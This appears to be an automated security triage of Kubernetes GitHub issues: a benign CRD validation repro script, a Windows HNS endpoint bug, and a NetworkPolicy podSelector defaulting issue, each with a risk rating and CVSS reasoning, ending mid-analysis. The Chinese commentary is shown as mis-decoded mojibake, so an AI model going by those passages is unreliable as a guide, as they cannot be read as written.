
                    # We collect the first cause message if available, otherwise the main message
                    # to see if *which* field fails first changes.
                    first_cause_message = "N/A"
                    if causes:
                         # Sorting causes by field can make the combined message more stable,
                         # but here we want to see the raw first reported error if possible.
                         # Let's just take the message from the first cause entry.
                         first_cause_message = causes[0].get("message", "Cause message missing")

                    # Use a tuple of relevant fields if multiple errors are reported consistently
                    # For simplicity, let's just capture the first error message reported.
                    error_key = first_cause_message if causes else main_message

                    if error_key not in observed_error_messages:
                        print(f"  New validation error observed: {error_key}")
                        observed_error_messages.add(error_key)
                    else:
                         print(f"  Seen validation error again: {error_key}")

                except json.JSONDecodeError:
                    print(f"  Attempt {i+1} failed with non-JSON body: {e.status} - {e.body}")
                except Exception as parse_exc:
                     print(f"  Attempt {i+1} failed. Error parsing exception body: {parse_exc}. Raw body: {e.body}")

            else:
                # Handle other API errors if necessary
                 print(f"  Attempt {i+1} failed with unexpected API error: {e.status} - {e.reason}")
                 print(f"  Body: {e.body}")
        except Exception as e:
            print(f"  Attempt {i+1} failed with unexpected error: {e}")

        # Small delay between attempts
        time.sleep(0.5)


    # --- Analysis and Cleanup ---
    print("\n--- Results ---")
    print(f"Observed {len(observed_error_messages)} unique primary validation error messages:")
    for msg in observed_error_messages:
        print(f"- {msg}")

    if len(observed_error_messages) > 1:
        print("\nSUCCESS: Observed multiple different validation error messages, demonstrating non-deterministic order.")
    elif len(observed_error_messages) == 1:
        print("\nINFO: Only one unique validation error message observed. The non-determinism might not be apparent in this environment/configuration or with this number of attempts.")
        print("      Try increasing MAX_ATTEMPTS or modifying the CRD/CR rules.")
    else:
         print("\nWARNING: No validation errors captured. Check CRD/CR definitions and script logic.")


    print("\n--- Cleanup ---")
    try:
        print(f"Deleting CRD {crd_name}...")
        api_extensions_client.delete_custom_resource_definition(name=crd_name)
        print(f"CRD {crd_name} deleted.")
    except ApiException as e:
        if e.status == 404:
            print(f"CRD {crd_name} not found (already deleted?).")
        else:
            print(f"Error deleting CRD {crd_name}: {e.status} - {e.reason}")
            try:
                error_body = json.loads(e.body)
                print(f"Error details: {json.dumps(error_body, indent=2)}")
            except json.JSONDecodeError:
                print(f"Error body: {e.body}")
    except Exception as e:
        print(f"An unexpected error occurred during CRD deletion: {e}")

    end_time = datetime.datetime.now()
    print(f"\nScript finished in {(end_time - start_time).total_seconds():.2f} seconds.")

# Execute main function directly
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1.  **ç›®çš„**: è¯¥è„šæœ¬æ—¨åœ¨é€šè¿‡å®è·µæ¼”ç¤ºIssueä¸­æè¿°çš„CRD CELéªŒè¯é¡ºåºä¸ç¡®å®šæ€§é—®é¢˜ã€‚å®ƒä¼šåˆ›å»ºä¸€ä¸ªåŒ…å«å¤šä¸ªç®€å•CELéªŒè¯è§„åˆ™çš„CRDï¼Œç„¶åå¤šæ¬¡å°è¯•åˆ›å»ºä¸€ä¸ªè¿åè¿™äº›è§„åˆ™çš„CRå®ä¾‹ã€‚é€šè¿‡æ•è·å¹¶æ¯”è¾ƒæ¯æ¬¡å¤±è´¥æ—¶API Serverè¿”å›çš„éªŒè¯é”™è¯¯ä¿¡æ¯ï¼Œæ¥è§‚å¯Ÿé”™è¯¯ä¿¡æ¯æ˜¯å¦ä¼šå› ä¸ºéªŒè¯è§„åˆ™æ‰§è¡Œé¡ºåºçš„éšæœºæ€§è€Œå‘ç”Ÿå˜åŒ–ã€‚
2.  **ç¯å¢ƒå‡è®¾**:
    *   è„šæœ¬å‡è®¾æœ¬åœ°å·²é…ç½®å¥½`kubectl`ç¯å¢ƒï¼Œå¹¶ä¸”`~/.kube/config`æ–‡ä»¶åŒ…å«è®¿é—®ç›®æ ‡Kubernetesé›†ç¾¤çš„æœ‰æ•ˆå‡­è¯ã€‚
    *   æ‰§è¡Œè„šæœ¬çš„ç”¨æˆ·éœ€è¦æœ‰åœ¨`default`å‘½åç©ºé—´åˆ›å»ºCRDå’Œå¯¹åº”CRçš„æƒé™ã€‚
3.  **å·¥ä½œæµç¨‹**:
    *   **åˆå§‹åŒ–**: åŠ è½½Kubernetesé…ç½®ï¼Œåˆ›å»ºä¸Kubernetes APIäº¤äº’çš„å®¢æˆ·ç«¯ï¼ˆ`ApiextensionsV1Api`ç”¨äºCRDæ“ä½œï¼Œ`CustomObjectsApi`ç”¨äºCRæ“ä½œï¼‰ã€‚
    *   **CRDå®šä¹‰**: å®šä¹‰ä¸€ä¸ªåä¸º`mydeterministictests.example.com`çš„CRDï¼Œå…¶`spec`ä¸‹åŒ…å«`fieldA` (int > 10)ã€`fieldB` (string length < 5) å’Œ `fieldC` (boolean == true) ä¸‰ä¸ªå¸¦æœ‰CELéªŒè¯è§„åˆ™çš„å­—æ®µã€‚
    *   **CRDåˆ›å»º**: å°è¯•åœ¨é›†ç¾¤ä¸­åˆ›å»ºè¿™ä¸ªCRDã€‚å¦‚æœCRDå·²å­˜åœ¨ï¼Œåˆ™ç»§ç»­ï¼›å¦‚æœå‘ç”Ÿå…¶ä»–é”™è¯¯ï¼Œåˆ™é€€å‡ºã€‚åˆ›å»ºåä¼šç­‰å¾…ä¸€å°æ®µæ—¶é—´ï¼ˆ10ç§’ï¼‰ä»¥ç¡®ä¿CRDåœ¨é›†ç¾¤ä¸­å¯ç”¨ã€‚
    *   **CRå®šä¹‰**: å®šä¹‰ä¸€ä¸ªCRå®ä¾‹ï¼Œè¯¥å®ä¾‹æ•…æ„è¿å`fieldA`ã€`fieldB`å’Œ`fieldC`çš„æ‰€æœ‰è§„åˆ™ã€‚
    *   **é‡å¤åˆ›å»ºCR**: åœ¨ä¸€ä¸ªå¾ªç¯ä¸­ï¼ˆæœ€å¤š`MAX_ATTEMPTS`æ¬¡ï¼Œä¸”æ€»è¿è¡Œæ—¶é—´ä¸è¶…è¿‡`TIMEOUT_SECONDS`ï¼‰ï¼Œå°è¯•åˆ›å»ºä¸Šè¿°CRå®ä¾‹ã€‚ä¸ºé¿å…å‘½åå†²çªï¼Œæ¯æ¬¡å°è¯•ä½¿ç”¨ä¸åŒçš„CRåç§°ã€‚
    *   **é”™è¯¯æ•è·ä¸åˆ†æ**:
        *   é¢„æœŸåˆ›å»ºä¼šå¤±è´¥ï¼Œå¹¶è¿”å›`ApiException`ï¼ŒçŠ¶æ€ç ä¸º422 (Unprocessable Entity)ã€‚
        *   è„šæœ¬æ•è·æ­¤å¼‚å¸¸ï¼Œè§£æè¿”å›çš„JSONé”™è¯¯ä½“ï¼Œæå–`details.causes`ä¸­çš„ç¬¬ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼ˆæˆ–ä¸»é”™è¯¯ä¿¡æ¯ï¼‰ã€‚
        *   å°†æå–åˆ°çš„é”™è¯¯ä¿¡æ¯æ·»åŠ åˆ°ä¸€ä¸ªé›†åˆï¼ˆ`observed_error_messages`ï¼‰ä¸­ï¼Œè¯¥é›†åˆè‡ªåŠ¨å»é‡ã€‚
        *   æ‰“å°æ¯æ¬¡è§‚å¯Ÿåˆ°çš„é”™è¯¯ä¿¡æ¯ï¼Œå¹¶æŒ‡å‡ºæ˜¯æ–°çš„è¿˜æ˜¯é‡å¤çš„ã€‚
    *   **ç»“æœæŠ¥å‘Š**: å¾ªç¯ç»“æŸåï¼Œæ‰“å°æ”¶é›†åˆ°çš„æ‰€æœ‰å”¯ä¸€é”™è¯¯ä¿¡æ¯ã€‚å¦‚æœé›†åˆä¸­åŒ…å«å¤šä¸ªä¸åŒçš„é”™è¯¯ä¿¡æ¯ï¼Œåˆ™è¯´æ˜æˆåŠŸå¤ç°äº†éªŒè¯é”™è¯¯ä¿¡æ¯çš„ä¸ç¡®å®šæ€§ã€‚
    *   **æ¸…ç†**: æœ€åï¼Œå°è¯•åˆ é™¤ä¹‹å‰åˆ›å»ºçš„CRDï¼Œä»¥ä¿æŒé›†ç¾¤å¹²å‡€ã€‚
4.  **è¿è¡Œä¸è§‚å¯Ÿ**: è¿è¡Œæ­¤è„šæœ¬ã€‚å¦‚æœè¾“å‡ºæ˜¾ç¤ºæ•è·åˆ°äº†å¤šä¸ªä¸åŒçš„é”™è¯¯æ¶ˆæ¯ï¼ˆä¾‹å¦‚ï¼Œæœ‰æ—¶æŠ¥å‘Š`fieldA`è¿è§„ï¼Œæœ‰æ—¶æŠ¥å‘Š`fieldB`è¿è§„ï¼Œæœ‰æ—¶æŠ¥å‘Š`fieldC`è¿è§„ï¼‰ï¼Œåˆ™è¯æ˜äº†Issueä¸­æè¿°çš„ç°è±¡ã€‚å¦‚æœåªè§‚å¯Ÿåˆ°ä¸€ç§é”™è¯¯ä¿¡æ¯ï¼Œå¯èƒ½æ„å‘³ç€åœ¨è¯¥ç‰¹å®šç¯å¢ƒæˆ–å°è¯•æ¬¡æ•°ä¸‹ï¼Œéšæœºæ€§æœªè¡¨ç°å‡ºæ¥ï¼Œæˆ–è€…API Serverçš„å®ç°ç»†èŠ‚ä½¿å¾—æŸä¸ªé”™è¯¯æ€»æ˜¯å…ˆè¢«æŠ¥å‘Šã€‚

---


## Issue #130963 [Windows] HNS endpoints creation fails after remote HNS endpoints with same IP address were created

- Issue é“¾æ¥ï¼š[#130963](https://github.com/kubernetes/kubernetes/issues/130963)

### Issue å†…å®¹

#### What happened?

When deploying Windows containers on Windows Nodes, some Windows containers fails to have network configuration inside like this:
```
S C:\> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : windows-server-iis-ltsc2022-58467d4759-vgzjr
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
```

This issue happens for Windows containers that got assigned the same IP address that was previously assigned to pods on Linux but were deleted later.

When we create a Pod on Linux and a `LoadBalancer` service type that refers to Linux pod, `kube-proxy` on Windows create HNS endpoints of Remote type. If we delete these Linux pods, IP addresses assigned to these pods are released and Remote HNS endpoints are deleted from Windows nodes.

When I deploy Windows pod, and if this Windows pod gets assigned the same IP as Linux pod, HNS endpoint for these Windows containers fails to be created causing networking issues inside Windows container.

This issue is a likely regression due to #124092

#### What did you expect to happen?

All Windows containers should successfully create HNS endpoint and networking should work inside Windows containers.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Deploy kubernetes cluster with limited available IPs for pods on both Linux and Windows node.
2. Deploy Linux pods that consume almost all IPs.
3. Deploy service type LoadBalancer that refer to Linux pods, This will trigger `kube-proxy` to create Remote HNS endpoint on Windows. This Remote HNS endpoint will have Linux pod IP.
4. Scale down the Linux pods to 1.
5. Deploy Windows pods so that same IP address from Linux pod can be reassigned to Windows Pods.
6. HNS endpoints for Windows pods with same address will not be created.
7. Internet connectivity inside these Windows pod will fail.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
1.31 and higher only
```

</details>


#### Cloud provider

<details>
EKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture

BuildNumber  Caption                                   OSArchitecture  Version
20348        Microsoft Windows Server 2022 Datacenter  64-bit          10.0.20348
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨Kubernetesé›†ç¾¤ä¸­æ··åˆéƒ¨ç½²Linuxå’ŒWindowsèŠ‚ç‚¹æ—¶å¯èƒ½å‡ºç°çš„ç½‘ç»œé—®é¢˜ã€‚å…·ä½“åœºæ™¯å¦‚ä¸‹ï¼š

1.  åœ¨é›†ç¾¤ä¸­ï¼ˆå‡è®¾IPèµ„æºæœ‰é™ï¼‰ï¼Œå…ˆéƒ¨ç½²Linux Podã€‚
2.  åˆ›å»ºä¸€ä¸ªç±»å‹ä¸º `LoadBalancer` çš„Serviceï¼ŒæŒ‡å‘è¿™äº›Linux Podã€‚`kube-proxy` ä¼šåœ¨WindowsèŠ‚ç‚¹ä¸Šä¸ºè¿™äº›Linux Pod IPåˆ›å»ºç±»å‹ä¸º `Remote` çš„HNSï¼ˆHost Network Serviceï¼‰Endpointã€‚
3.  åˆ é™¤æˆ–ç¼©å‡Linux Podï¼Œé‡Šæ”¾å…¶IPåœ°å€ï¼Œå¯¹åº”çš„ `Remote` HNS Endpointä¹Ÿä¼šåœ¨WindowsèŠ‚ç‚¹ä¸Šè¢«åˆ é™¤ã€‚
4.  æ¥ç€éƒ¨ç½²Windows Podï¼Œå¦‚æœæŸä¸ªWindows Podæ°å¥½è¢«åˆ†é…åˆ°äº†ä¹‹å‰Linux Podä½¿ç”¨è¿‡å¹¶å·²é‡Šæ”¾çš„IPåœ°å€ã€‚
5.  æ­¤æ—¶ï¼Œä¸ºè¿™ä¸ªWindows Podåˆ›å»ºå…¶æœ¬åœ°HNS Endpointçš„æ“ä½œä¼šå¤±è´¥ï¼Œå¯¼è‡´è¯¥Windows Podå†…éƒ¨æ— æ³•é…ç½®ç½‘ç»œï¼ˆ`ipconfig /all` æ˜¾ç¤ºæ— IPé…ç½®ï¼‰ï¼Œè¿›è€Œæ— æ³•è¿›è¡Œç½‘ç»œé€šä¿¡ã€‚

é—®é¢˜æ ¹æºåœ¨äºï¼ŒåŒä¸€ä¸ªIPåœ°å€å…ˆåè¢«ç”¨ä½œ`Remote` HNS Endpointï¼ˆä»£è¡¨é›†ç¾¤ä¸­å…¶ä»–èŠ‚ç‚¹çš„Podï¼‰å’Œæœ¬åœ°HNS Endpointï¼ˆä»£è¡¨æœ¬èŠ‚ç‚¹çš„Podï¼‰æ—¶ï¼ŒHNS Endpointçš„åˆ›å»º/æ¸…ç†æœºåˆ¶å¯èƒ½å­˜åœ¨å†²çªæˆ–çŠ¶æ€æœªå®Œå…¨é‡ç½®ï¼Œå¯¼è‡´åç»­æœ¬åœ°Endpointåˆ›å»ºå¤±è´¥ã€‚

**å®‰å…¨é£é™©åˆ†æï¼š**

1.  **é—®é¢˜æ€§è´¨ï¼š** è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ç¼ºé™·ï¼ˆBugï¼‰ï¼Œå½±å“äº†ç‰¹å®šæ¡ä»¶ä¸‹Windowså®¹å™¨çš„ç½‘ç»œå¯ç”¨æ€§ã€‚
2.  **å½±å“èŒƒå›´ï¼š** å½±å“çš„æ˜¯é‚£äº›æ°å¥½è·å–åˆ°ç‰¹å®šé‡ç”¨IPåœ°å€çš„æ–°åˆ›å»ºçš„Windows Podçš„ç½‘ç»œåŠŸèƒ½ã€‚å·²ç»è¿è¡Œçš„Podä¸å—å½±å“ã€‚
3.  **è§¦å‘æ¡ä»¶ï¼š** éœ€è¦ç‰¹å®šçš„æ“ä½œåºåˆ—ï¼ˆåˆ›å»ºLinux Pod -> åˆ›å»ºæŒ‡å‘Linux Podçš„LoadBalancer Service -> åˆ é™¤Linux Pod -> åˆ›å»ºWindows Podè·å¾—ç›¸åŒIPï¼‰å’Œç¯å¢ƒæ¡ä»¶ï¼ˆIPåœ°å€æ± æœ‰é™å¯¼è‡´IPé‡ç”¨ï¼‰ã€‚
4.  **æ”»å‡»è€…åˆ©ç”¨å¯èƒ½æ€§ï¼š**
    *   ä¸€ä¸ªæ”»å‡»è€…å¦‚æœæ‹¥æœ‰åœ¨é›†ç¾¤ä¸­åˆ›å»º/åˆ é™¤Podå’Œåˆ›å»º`LoadBalancer` Serviceçš„æƒé™ï¼ˆé€šå¸¸æ˜¯è¾ƒé«˜çš„æƒé™ï¼Œå¦‚`edit`æˆ–`cluster-admin`è§’è‰²ï¼‰ï¼Œç†è®ºä¸Šå¯ä»¥å°è¯•é€šè¿‡ç²¾å¿ƒç¼–æ’èµ„æºçš„åˆ›å»ºå’Œåˆ é™¤æ¥è§¦å‘è¿™ä¸ªBugï¼Œå¯¼è‡´åç»­åœ¨æ­¤WindowsèŠ‚ç‚¹ä¸Šè°ƒåº¦ä¸”è·å¾—ç‰¹å®šIPçš„Windows Podç½‘ç»œè¿æ¥å¤±è´¥ã€‚
    *   è¿™å¯ä»¥è¢«è§†ä¸ºä¸€ç§æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼Œç›®æ ‡æ˜¯é˜»æ­¢æ–°éƒ¨ç½²çš„Windows Podè·å¾—ç½‘ç»œè¿æ¥ã€‚
    *   æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬5æ¡ï¼Œç”±äºå®æ–½æ­¤æ”»å‡»éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»º/ä¿®æ”¹Podå’ŒServiceï¼ˆéåªè¯»ï¼‰çš„æƒé™ï¼Œè¿™ç§DoSåº”è¢«è§†ä¸ºéœ€è¦è¾ƒé«˜æƒé™æ‰èƒ½è§¦å‘ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚
5.  **å…¶ä»–å®‰å…¨é£é™©ï¼š** è¯¥é—®é¢˜æ²¡æœ‰ç›´æ¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€æƒé™æå‡ã€ä¿¡æ¯æ³„éœ²ç­‰é«˜é£é™©å®‰å…¨é—®é¢˜ï¼ˆè§„åˆ™7ï¼‰ã€‚è™½ç„¶å½±å“äº†å®¹å™¨çš„ç½‘ç»œå¯ç”¨æ€§ï¼Œä½†å¹¶æœªç ´åèŠ‚ç‚¹æˆ–é›†ç¾¤çš„æ•´ä½“å®‰å…¨æ€§ã€‚ä¹Ÿæ²¡æœ‰è¿¹è±¡è¡¨æ˜ä½æƒé™ç”¨æˆ·èƒ½åˆ©ç”¨æ­¤é—®é¢˜å½±å“å…¶ä»–ç”¨æˆ·ï¼ˆè§„åˆ™8ï¼‰ã€‚

**CVSS 3.1 è¯„ä¼°ï¼ˆéæ­£å¼ï¼‰ï¼š**
*   **AV:N** (æ”»å‡»è€…é€šè¿‡K8s APIäº¤äº’)
*   **AC:H** (éœ€è¦ç‰¹å®šé¡ºåºçš„æ“ä½œã€IPé‡ç”¨ã€LoadBalancer Serviceç­‰å¤æ‚æ¡ä»¶)
*   **PR:H** (éœ€è¦åˆ›å»º/åˆ é™¤Podå’ŒServiceçš„æƒé™)
*   **UI:N**
*   **S:U** (å½±å“èŒƒå›´ä»…é™ç‰¹å®šå®¹å™¨çš„ç½‘ç»œï¼Œæœªæ”¹å˜å®‰å…¨åŸŸ)
*   **C:N**
*   **I:N**
*   **A:L** (å¯¼è‡´éƒ¨åˆ†æ–°å®¹å™¨çš„ç½‘ç»œä¸å¯ç”¨)

ç»¼åˆè¯„åˆ†è¾ƒä½ï¼Œå±äºLowçº§åˆ«ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜ä¸ºä½é£é™©ï¼Œæ— éœ€æä¾›å¤ç°è„šæœ¬ã€‚
# ä½é£é™©é—®é¢˜çš„åŸå› åœ¨äºå…¶æœ¬è´¨æ˜¯åŠŸèƒ½æ€§ç¼ºé™·å¯¼è‡´çš„å¯ç”¨æ€§é—®é¢˜ï¼Œ
# ä¸”åˆ©ç”¨è¯¥é—®é¢˜è¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»éœ€è¦è¾ƒé«˜çš„ Kubernetes é›†ç¾¤æƒé™ï¼ˆåˆ›å»º/åˆ é™¤ Pod å’Œ Serviceï¼‰ï¼Œ
# ä¸æ»¡è¶³é«˜é£é™©å®šä¹‰ã€‚
# å¦‚æœéœ€è¦æ¨¡æ‹Ÿè¯¥åœºæ™¯ç”¨äºæµ‹è¯•ï¼Œå¯ä»¥æŒ‰ç…§ Issue ä¸­æè¿°çš„æ­¥éª¤æ‰‹åŠ¨æ“ä½œ Kubernetes èµ„æºã€‚

print("è¯¥Issueè¢«è¯„å®šä¸ºä½é£é™©ï¼Œæ ¹æ®è¦æ±‚ï¼Œæ— éœ€ç”ŸæˆPOCè„šæœ¬ã€‚")
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Issueæè¿°çš„é—®é¢˜æ˜¯Windows HNS Endpointåœ¨ç‰¹å®šIPåœ°å€é‡ç”¨åœºæ™¯ä¸‹åˆ›å»ºå¤±è´¥ï¼Œå¯¼è‡´æ–°Windowså®¹å™¨ç½‘ç»œä¸å¯ç”¨çš„åŠŸèƒ½æ€§Bugã€‚è™½ç„¶ç†è®ºä¸Šæ‹¥æœ‰é«˜æƒé™çš„æ”»å‡»è€…å¯ä»¥å°è¯•åˆ©ç”¨æ­¤Bugå¯¹æ–°éƒ¨ç½²çš„ã€è·å¾—ç‰¹å®šIPçš„Windowså®¹å™¨è¿›è¡Œç½‘ç»œæ‹’ç»æœåŠ¡ï¼Œä½†è¿™éœ€è¦èƒ½å¤Ÿæ§åˆ¶Podå’ŒLoadBalancer Serviceçš„ç”Ÿå‘½å‘¨æœŸï¼Œå±äºè¾ƒé«˜æƒé™æ“ä½œã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬5æ¡ï¼Œæ­¤ç±»éœ€è¦è¾ƒé«˜æƒé™æ‰èƒ½è§¦å‘çš„DoSæ”»å‡»ä¸åº”è¢«è¯„ä¸ºé«˜é£é™©ã€‚è¯¥é—®é¢˜ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€ææƒã€ä¿¡æ¯æ³„éœ²ç­‰ä¸¥é‡å®‰å…¨åæœã€‚å› æ­¤ï¼Œè¯¥é—®é¢˜è¢«è¯„å®šä¸º**ä½é£é™©**ï¼Œæ— éœ€æä¾›å¤ç°POCè„šæœ¬ã€‚å¦‚æœéœ€è¦éªŒè¯æ­¤é—®é¢˜ï¼Œå»ºè®®åœ¨æµ‹è¯•ç¯å¢ƒä¸­éµå¾ªIssueæè¿°çš„æ­¥éª¤æ‰‹åŠ¨åˆ›å»ºå’Œåˆ é™¤ç›¸å…³èµ„æºã€‚

---


## Issue #130896 Required field is not actually required

- Issue é“¾æ¥ï¼š[#130896](https://github.com/kubernetes/kubernetes/issues/130896)

### Issue å†…å®¹

#### What happened?

I am trying to solve the mystery of the "required" podSelector field in NetworkPolicy spec. It says that the field is "not optional" https://github.com/kubernetes/api/blob/c3130ba7ba2323372534032dd3153bf331fc59e2/networking/v1/types.go#L66-L68 but at the same time you can create a netpol without podSelector even being set, and it will be populated to the empty selector.
https://github.com/kubernetes/community/blob/master/contributors/devel/sig-architecture/api-conventions.md#optional-vs-required says
> The API server should not allow POSTing or PUTing a resource with this (required) field unset.

The fun part is that multi-netpol has coped fields from the netpol https://github.com/k8snetworkplumbingwg/multi-networkpolicy/blob/master/pkg/apis/k8s.cni.cncf.io/v1beta2/types.go#L65C2-L65C55
and (because it is a crd?) it doesn't allow this filed to be unset and returns "The MultiNetworkPolicy is invalid: spec.podSelector: Required value"

#### What did you expect to happen?

NetworkPolicy with empty podSelector to be rejected.
CRD and core APIs behave the same way.

#### How can we reproduce it (as minimally and precisely as possible)?
netpol.yaml
```
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: egress-deny
spec:
  policyTypes:
  - Egress
```
```
$ kubectl apply -f netpol.yaml
networkpolicy.networking.k8s.io/egress-deny created
$ kubectl get networkpolicy -oyaml
apiVersion: v1
items:
- apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    ...
  spec:
    podSelector: {}
    policyTypes:
    - Egress
kind: List
metadata:
  resourceVersion: ""
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.1
Kustomize Version: v5.5.0
Server Version: v1.31.1
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†KubernetesåŸç”Ÿ`NetworkPolicy` APIèµ„æºçš„ä¸€ä¸ªè¡Œä¸ºï¼šå°½ç®¡APIå®šä¹‰ä¸­`spec.podSelector`å­—æ®µè¢«æ ‡è®°ä¸ºå¿…éœ€ï¼ˆ"not optional"ï¼‰ï¼Œä½†ç”¨æˆ·å®é™…ä¸Šå¯ä»¥åœ¨ä¸æŒ‡å®šè¯¥å­—æ®µçš„æƒ…å†µä¸‹æˆåŠŸåˆ›å»º`NetworkPolicy`èµ„æºã€‚å½“ç”¨æˆ·è¿™æ ·åšæ—¶ï¼ŒKubernetes APIæœåŠ¡å™¨ä¼šè‡ªåŠ¨å°†`spec.podSelector`å­—æ®µå¡«å……ä¸ºä¸€ä¸ªç©ºçš„é€‰æ‹©å™¨ï¼ˆ`{}`ï¼‰ã€‚

æ ¹æ®Kubernetesçš„æ–‡æ¡£ï¼Œç©ºçš„é€‰æ‹©å™¨`podSelector: {}`ä¼šåŒ¹é…è¯¥NetworkPolicyæ‰€åœ¨å‘½åç©ºé—´ä¸‹çš„*æ‰€æœ‰*Podã€‚

è¯¥Issueçš„æ ¸å¿ƒåœ¨äºAPIè¡Œä¸ºä¸APIå®šä¹‰ï¼ˆä»¥åŠAPIçº¦å®šæ–‡æ¡£ï¼‰ä¹‹é—´çš„ä¸ä¸€è‡´æ€§ã€‚æäº¤è€…æœŸæœ›APIæœåŠ¡å™¨æ‹’ç»ç¼ºå°‘`podSelector`å­—æ®µçš„`NetworkPolicy`åˆ›å»ºè¯·æ±‚ï¼Œæˆ–è€…è‡³å°‘è®©åŸç”ŸAPIå’ŒCRDï¼ˆå¦‚`MultiNetworkPolicy`ï¼‰åœ¨æ­¤è¡Œä¸ºä¸Šä¿æŒä¸€è‡´ï¼ˆ`MultiNetworkPolicy` CRDä¼šæ‹’ç»ç¼ºå°‘è¯¥å­—æ®µçš„è¯·æ±‚ï¼‰ã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼š
1.  **æ½œåœ¨å½±å“**ï¼šå¦‚æœç”¨æˆ·é¢„æœŸåˆ›å»ºä¸€ä¸ªåªåº”ç”¨äºç‰¹å®šPodçš„`NetworkPolicy`ï¼Œä½†å¿˜è®°å¡«å†™`podSelector`ï¼Œè¯¥ç­–ç•¥å°†è¢«æ„å¤–åœ°åº”ç”¨äºå‘½åç©ºé—´ä¸­çš„æ‰€æœ‰Podã€‚å¦‚æœè¿™æ˜¯ä¸€ä¸ªé™åˆ¶æ€§ç­–ç•¥ï¼ˆä¾‹å¦‚ï¼Œé»˜è®¤æ‹’ç»æ‰€æœ‰å‡ºå£æµé‡ï¼Œå¦‚Issueä¸­çš„`egress-deny`ç¤ºä¾‹ï¼‰ï¼Œå®ƒå¯èƒ½å¯¼è‡´å‘½åç©ºé—´ä¸­æ‰€æœ‰æœåŠ¡ï¼ˆæˆ–è‡³å°‘æ˜¯é‚£äº›ä¾èµ–äºè¢«é˜»æ­¢æµé‡çš„æœåŠ¡ï¼‰çš„æ„å¤–ä¸­æ–­ï¼Œæ„æˆä¸€ç§æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚åä¹‹ï¼Œå¦‚æœåœ¨ä¸€ä¸ªé»˜è®¤æ‹’ç»çš„ç¯å¢ƒä¸­ï¼Œä¸€ä¸ªæœ¬æ„æ˜¯å°èŒƒå›´å…è®¸çš„ç­–ç•¥è¢«é”™è¯¯åœ°åº”ç”¨åˆ°æ‰€æœ‰Podï¼Œåˆ™å¯èƒ½å¯¼è‡´è¿‡åº¦æš´éœ²ã€‚
2.  **è§¦å‘æ¡ä»¶**ï¼šæ”»å‡»è€…ï¼ˆæˆ–è¯¯æ“ä½œçš„ç”¨æˆ·ï¼‰éœ€è¦æ‹¥æœ‰åœ¨ç›®æ ‡å‘½åç©ºé—´ä¸­åˆ›å»º`NetworkPolicy`èµ„æºçš„æƒé™ã€‚
3.  **ä¸è§„åˆ™çš„å¯¹åº”å…³ç³»**ï¼š
    *   è§„åˆ™3ï¼šè¿™æ˜¯ä¸€ä¸ªå®‰å…¨é—®é¢˜ï¼Œå› ä¸ºå®ƒå¯èƒ½å¯¼è‡´æ„å¤–çš„ç½‘ç»œç­–ç•¥åº”ç”¨ï¼Œæ½œåœ¨å½±å“æ˜¯å¯ç”¨æ€§ï¼ˆDoSï¼‰æˆ–ç­–ç•¥ç»•è¿‡ï¼ˆå–å†³äºç­–ç•¥å†…å®¹å’Œé»˜è®¤ç½‘ç»œç­–ç•¥ï¼‰ã€‚CVSSè¯„åˆ†è€ƒè™‘Availabilityå½±å“å¯èƒ½ä¸ºHighã€‚
